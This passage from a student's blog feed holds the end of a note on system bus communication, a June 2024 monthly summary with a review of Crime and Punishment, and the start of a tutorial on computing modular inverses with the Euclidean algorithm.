accent="true"><mrow><mi>W</mi><mi>A</mi><mi>I</mi><mi>T</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{WAIT}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>。</p><p>小结一下</p><p>以上三种通信方式都有几个共同点，在一个总线传输周期内：</p><ul><li>主模块发送地址和命令，占用总线</li><li>从模块准备数据，总线空闲</li><li>从模块向主模块发送数据，占用总线</li></ul><p>说明还有空闲，没有充分挖掘出总线每个时间的潜力。</p><h4 id="分离式通信"><a class="markdownIt-Anchor" href="#分离式通信"></a> 分离式通信</h4><p>分离式通信能实现总线利用的效率最大化，它把一个时钟周期拆成两部分。</p><ul><li>子周期1：主模块将地址、命令、主模块号放到系统总线上，一旦发送完，立即放弃总线使用权</li><li>子周期2：经选择、译码、读取一系列内部操作后，将A模块编号，B模块地址，所需数据放到总线上</li></ul><p>两个传输周期都是单方向的，每个模块都变成了主模块</p><p>特点是：</p><ol><li>各模块有权申请占用总线</li><li>采用同步方式通信，不等对方回答</li><li>各模块准备数据时，不占用总线</li><li>总线被占用时，无空闲</li></ol><p>……</p><p>……</p><p>第一部分暂时结束，敬请阅读第二部分^^</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/60e6e4dec743523c13ccc9fcabd56171.png" alt="60e6e4dec743523c13ccc9fcabd56171" /></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成指北 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
            <tag> 概论 </tag>
            
            <tag> 系统总线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6月总结·2024</title>
      <link href="/posts/b55416ea8e21/"/>
      <url>/posts/b55416ea8e21/</url>
      
        <content type="html"><![CDATA[<h1 id="6月总结2024"><a class="markdownIt-Anchor" href="#6月总结2024"></a> 6月总结·2024</h1><p>终于有时间写一写总结了，6月份的总结拖到七月下旬写是不是很奇怪……也没办法，一来复习周+期末周真的耗费了大量的精力，二来因为纯粹是在复习和考试也没有做成多少事，更别说学点Go什么其他的了。</p><p>不过还是浅浅的总结一下6月份吧，看我还记得多少。</p><h2 id="比赛篇"><a class="markdownIt-Anchor" href="#比赛篇"></a> 比赛篇</h2><h3 id="cet6"><a class="markdownIt-Anchor" href="#cet6"></a> CET·6</h3><p>想了半天还是把六级放了进来，毕竟这个月我唯一参加的比较大型的考试就只有六级。为了准备六级，我也还是稍微花了点心思去背背单词和刷题。大概做了六套卷子吧，感觉差不多了。最后考完自认为感觉良好，除了作文由于长期缺乏相关训练写出来的东西只能用悲剧来形容，其他的部分倒也还好，抛开听力不谈只错了4道完型填空和1道阅读，通过应该是没有太大问题。</p><p>虽然六级结束了，不过好歹把背单词的习惯保持了下来，感谢Duolingo:)</p><h2 id="书籍篇"><a class="markdownIt-Anchor" href="#书籍篇"></a> 书籍篇</h2><p>在5月总结中原定于6月完成的Go语言学习并没有完成，因为我大部分时间都去准备六级和复习了。所以6月份其实没有看多少编程相关的书籍~~，只能写写其他的水点字数。~~</p><h3 id="罪与罚"><a class="markdownIt-Anchor" href="#罪与罚"></a> *罪与罚</h3><p>在6月头几天抽空把《罪与罚》读完了，为后面的学习腾出精力。本来想要单独写一篇关于《罪与罚》的书评，但一来写一篇完整的书评咬文嚼字太耗费精力，二来距离我读完这本书也过去了一月有余，细节部分已经记不太清了，于是只好作罢。</p><p>我一开始为什么想要看这本书呢？貌似是在刷知乎时看到有人推荐《罪与罚》中的心理描写和人物刻画写的极其出彩，于是便想要自己亲自品味一番。但是看完全书后，我发现《罪与罚》与我想象中的形象有所差别。书的内容其实并不多，讲述的不过是一个男青年在杀人后与自己内心相搏斗挣扎后最终选择自首的故事。“罪”的内容只占很小一部分，而剩下的大部分内容都是在写“罚”。而“罚”中乃至全书都充斥着海量无比详细生动的心理描写。作者很擅长把握人的心理动作，能把人物的想法刻画的如此细节又不失冗杂无用是一项了不起的本事——不过对我而言多少还是有点太长了haha，有时候大版大版主人公的心理活动真是让我看的昏昏欲睡，要啃下这些也不是一件容易事。依我之见，陀思妥夫斯基多少有点水稿费之嫌，只不过低级作家水稿费写的烂，顶级作家水稿费还能写得好。</p><p>再来谈谈这本书的内核。这本书的内核是撕裂的，或者说其所想要传达的价值观，我并不完全认可，甚至连陀翁本人也未见得能够全盘接受。拉斯柯尔尼科夫深受无政府主义“高一等的人”思想毒害，而作者在拉斯柯尔尼科夫赎罪的过程中有力的批判了无政府主义等其他天马行空的“歪理”，但是最后作品却导向了宗教，否定了所有暴力反抗的道路，倡导书中女主角索尼娅“包容一切”的心态，也即文学史上著名的“索尼娅道路”。这一点必然和作者本人就是基督徒有所关系</p><p>面对个人无能为力难以左右的黑暗局势，我们要以怎样的心态活着？作者笔下真实露骨的俄罗斯社会是窒息的，马尔美拉陀夫一家的遭遇不忍卒读，拉斯柯尔尼科夫的困境令人嗟叹，上层社会却依旧歌舞升平，小人彼特罗维奇、伪君子斯维里加洛夫之流大行其道。时代的尘埃压得人根本喘不过气。</p><blockquote><p>对黑暗现实的描绘和批判，如他揭示的城市贫民生活的艰辛，对卢仁的冷酷卑鄙和极端利己主义，对地主斯维里加洛夫的荒淫无耻的批判，都突破了作家的反动说教，闪耀着清醒的现实主义的光芒。因而，这部作品才具有超越时间与空间的艺术力量，在世界范围内广泛流传。</p></blockquote><p>对处于历史“垃圾时间”的人们来说，该用什么样的信念支撑自己继续生活？作者认为，一切以暴力抗恶的作法都不足取，因为人无法逃避内心的惩罚，在毁灭他人的同时也毁灭了自身。相对的，他选择了索菲亚作为答案：</p><blockquote><p>听从内心的良知，谦卑下来，用牺牲的、看似微不足道的爱来改变这个罪恶世界的窄路。这似乎颇像圣经中对弥赛亚的记载：他来到这个世界，不是要带领十二营的天使暴力征服世界，建立他的国度，而是借着温柔的服侍、牺牲的爱，征服世界的罪，把罪的国度变成爱与义的国度。</p></blockquote><p>只不过，在我看来，弥赛亚的背后起码还有着十二营的天使，而索菲亚除了把一切交付给上帝逆来顺受根本没有所谓选择。选择用爱与正义去感化黑暗的世界，可能是这本现实主义鸿篇巨著中最不现实主义的一点。这也许是生活在“王侯将相，宁有种乎”这片土地上的我们永远也无法理解的事情。</p><blockquote><p>作者还力图把拉斯柯尔尼科夫的犯罪行为归结为抛弃了对上帝的信仰所致。陀思妥耶夫斯基在小说中宣扬的这些宗教思想，与整部作品所显示的强大批判力量是不相协调的：这里充分表现出作者世界观的尖锐矛盾。</p></blockquote><p>《罪与罚》也被人称作是一本政治小说，在我看来的确所言非虚。抛开宗教的理念不谈，作者对如何对抗“罪”的思考值得人们反复揣摩。</p><blockquote><p>用“罪”的形式对抗这个罪恶的世界，但是灵魂却陷入了无边的痛苦。</p><p>面对罪恶充斥的世界究竟该怎么做?能否凭借高尚的动机用罪恶的形式来对抗罪恶?这实在是一个艰难的问题。</p><p>回答不可以么?杀人是罪，但是粉碎旧世界带来进步的革命就是鲜血写成，且法律本身也判处死刑。</p><p>所以回答可以么?那么私刑为何不可?一个存在大量劫富济贫“侠盗”的武侠社会是否是理想国?</p><p>我们难以回答，是因为我们不过是人。我们深知自己的劣根性和不足。我们既无法拥有一架上帝的天平，可以把刑罚当做砝码称量出一个绝对公平的世界，也无法拥有一把上帝的宝剑，可以瞬间粉碎旧世界回归伊甸园。事实上，在这个充斥罪恶的世界里，我们不得不提炼出“罪恶”矿石中的暴力、欺骗…铸造一柄双刃剑来对抗罪恶，而为了减少这柄剑的反噬，我们选择了多人或者说国家来执掌它，而这柄双刃剑是否仍旧是罪恶，究竟是可以根据结果或者执剑人的动机来判断，又或是罪终究是罪?而执剑人的动机又能否保证全然是善，如同罗佳在砍下斧头的时候，是否完全没想过谋财?(显然不是)</p><p>我们仍旧难以回答，因为我们不过是人。我们只能在超越我们认知、经验的问题上努力探索，但是无法凭借一介人类之身定义整个人类。</p></blockquote><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><p>期末复习期间整理出了几篇博客，姑且算在里面吧。其中关于计算机组成方面投入精力最多，个人认为<a href="https://adam8en.github.io/2024/06/21/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E6%8C%87%E5%8C%97/">计算机组成指北 | Adam8enの8log</a>就是我最后的波纹了，虽然最后成绩也实在是谈不上满意，对不住与之相称的期望（苦笑）。</p><h2 id="随便写点"><a class="markdownIt-Anchor" href="#随便写点"></a> 随便写点</h2><p>鉴于现在已经7月下旬，我也难以复刻出6月的想法，就写写当下一些想说的话吧，顺带对上个学期再做一个反思。</p><p>先说结论吧：实在是差强人意。</p><p>回顾整个大二下学期，应该是我入学以来最为忙碌的一个学期，但是收获感却并不高。就像是在跑步机上狂奔，抬头一看仍然人在原地。我打了很多比赛，经手了很多项目，能带给我回报的机会却并不多。如果站在功利的角度来看，过去的那四个月里起码我可以去玩两个月艾尔登法环。尤其是期末考试的绩点也并不理想，虽然有较大进步，但距离预期仍然很远。</p><p>是我在自欺欺人吗？是我太好大喜功了吗？我不时扪心自问，但永远得不到一个恒定的答案。</p><p>大学也已经过去了一半了，我不得不直面那个曾经怎么也不愿意承认的事实：努力并不一定就会有回报，而在高考后更是如此。类似想说的话还有很多很多，但自从我进入大学后目睹的一些滑稽现实已经多到让我记不请了。逆天改命的故事之所以久久被人传颂，正是因为它只能停留在绝大多数人抬头仰视的幻想之中，如海市蜃楼让人心向往焉；而拨开人们对未来点缀的云雾，现实往往还是龙生龙凤生凤。</p><p>这是命运吗？</p><p>起码此时此刻，我仍然有拒绝的权利。</p><p>最近又接手了一个项目，我们拭目以待吧。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/116493728_p0.png" alt="116493728_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 月度总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈求逆元</title>
      <link href="/posts/442cd081ad6f/"/>
      <url>/posts/442cd081ad6f/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈求逆元"><a class="markdownIt-Anchor" href="#浅谈求逆元"></a> 浅谈求逆元</h1><p>本篇博客是对密码学中数论部分的整理，主要关注如何求同余运算中的逆元。重点是欧几里得算法和扩展欧几里得算法的应用，难度中等偏下，但是十分重要。之后再介绍费马小定理求解逆元，利用快速幂算法，应该能够比较快速的求出解。</p><p>本文假设读者已经掌握基础的数论知识，故基础部分略过不讲。本文章将按照欧几里得算法、扩展欧几里得算法、费马小定理的顺序讲解。后续还可以扩展到中国剩余定理，参见文章<a href="https://adam8en.github.io/2024/04/21/%E8%AF%BE%E5%A0%82%E9%9A%8F%E7%AC%94/%E6%B5%85%E8%B0%88%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/">浅谈中国剩余定理 | Adam8en の 8log</a>。</p><p>🚀🚀🚀</p><h2 id="欧几里得算法"><a class="markdownIt-Anchor" href="#欧几里得算法"></a> 欧几里得算法</h2><p>在介绍欧几里得算法前，我们先引入最大公约数的概念。</p><blockquote><p>定理：设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">a,b,c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span></span></span></span>是任意不全为零的整数，且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mi>q</mi><mi>b</mi><mo>+</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">a=qb+c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>是整数。</p></blockquote><p>则有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\gcd(a,b)=\gcd(b,c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>，即被除数和除数的最大公因子与除数和余数的最大公因子相同。</p><blockquote><p>例如：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>18</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo><mo>=</mo><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>12</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">)</mo><mo>=</mo><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">\gcd(18,12)=\gcd(12,6)=\gcd(6,0)=6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span></span></span></span></p></blockquote><p>于是这个定理被总结为<strong>欧几里得算法（Euclidean Algorithm）</strong>，因此也得名辗转相除法。</p><p>任给两个整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span></span></span></span>，设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>&gt;</mo><mi>b</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">a&gt;b&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，则有：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtable rowspacing="0.15999999999999992em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>=</mo><mi>b</mi><msub><mi>q</mi><mn>0</mn></msub><mo>+</mo><msub><mi>r</mi><mn>0</mn></msub><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo>&lt;</mo><msub><mi>r</mi><mn>0</mn></msub><mo>&lt;</mo><mi>b</mi><mo separator="true">,</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo>=</mo><msub><mi>r</mi><mn>0</mn></msub><msub><mi>q</mi><mn>1</mn></msub><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo>&lt;</mo><msub><mi>r</mi><mn>1</mn></msub><mo>&lt;</mo><msub><mi>r</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr></mtable></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mspace width="1em"/><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>=</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><msub><mi>q</mi><mi>n</mi></msub><mo>+</mo><msub><mi>r</mi><mi>n</mi></msub><mo separator="true">,</mo><mspace width="1em"/><mn>0</mn><mo>&lt;</mo><msub><mi>r</mi><mi>n</mi></msub><mo>&lt;</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi mathvariant="normal">r</mi><mi mathvariant="normal">n</mi></msub><msub><mi mathvariant="normal">q</mi><mrow><mi mathvariant="normal">n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi mathvariant="normal">r</mi><mrow><mi mathvariant="normal">n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mspace width="1em"/><msub><mi mathvariant="normal">r</mi><mrow><mi mathvariant="normal">n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{c}\begin{array}{cc}a=b q_{0}+r_{0}, &amp; 0&lt;r_{0}&lt;b, \\b=r_{0} q_{1}+r_{1}, &amp; 0&lt;r_{1}&lt;r_{0}\end{array}\\\quad......\\\begin{array}{c}r_{n-2}=r_{n-1} q_{n}+r_{n}, \quad 0&lt;r_{n}&lt;r_{n-1} \\r_{n-1}=\mathrm{r}_{\mathrm{n}} \mathrm{q}_{\mathrm{n}+1}+\mathrm{r}_{\mathrm{n}+1}, \quad \mathrm{r}_{\mathrm{n}+1}=0\end{array}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6em;vertical-align:-2.7500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.25em;"><span style="top:-5.25em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span 